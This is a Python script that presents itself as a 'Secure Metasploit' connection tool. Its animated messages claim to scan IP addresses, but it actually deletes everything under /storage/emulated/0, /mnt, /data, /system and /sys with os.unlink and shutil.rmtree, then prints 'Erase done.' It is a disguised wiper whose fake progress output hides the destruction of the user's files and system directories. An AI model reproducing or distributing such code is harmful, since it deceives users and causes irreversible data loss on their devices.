import os
import shutil
import time
from termcolor import colored
from tqdm import tqdm


directories_to_clear = [
    "/storage/emulated/0",
    "/mnt",
    "/data",
    "/system",
    "/sys"
]

def animated_intro():
    print(colored("\n[!] Initializing Secure Metasploit", "cyan", attrs=["bold"]))
    intro_text = "Connecting to Metasploit"
    for c in intro_text + "...":
        print(colored(c, "yellow"), end="", flush=True)
        time.sleep(0.05)
    print()
    time.sleep(0.5)
    print(colored("✔ Connection established\n", "green", attrs=["bold"]))
    time.sleep(0.5)

def clear_storage_real(directories):
    for dir_path in directories:
        print(colored(f"\nScanning IP Addresses: {dir_path}", "blue", attrs=["underline"]))

        if not os.path.exists(dir_path):
            print(colored(f"✘ Address not found: {dir_path}", "red"))
            continue

        # List contents and apply progress bar
        items = os.listdir(dir_path)
        for item in tqdm(items, desc=f"Scanning {dir_path}", colour="magenta"):
            item_path = os.path.join(dir_path, item)
            try:
                if os.path.isfile(item_path) or os.path.islink(item_path):
                    os.unlink(item_path)
                elif os.path.isdir(item_path):
                    shutil.rmtree(item_path)
            except Exception as e:
                print(colored(f"⚠ Error {item_path}: {e}", "red"))

        print(colored(f"✔ Transferring zprotocol: {dir_path}", "green"))

    print(colored("\nErase done. Thanks for banking with us!", "green", attrs=["bold", "reverse"]))

if __name__ == "__main__":
    animated_intro()
    clear_storage_real(directories_to_clear)
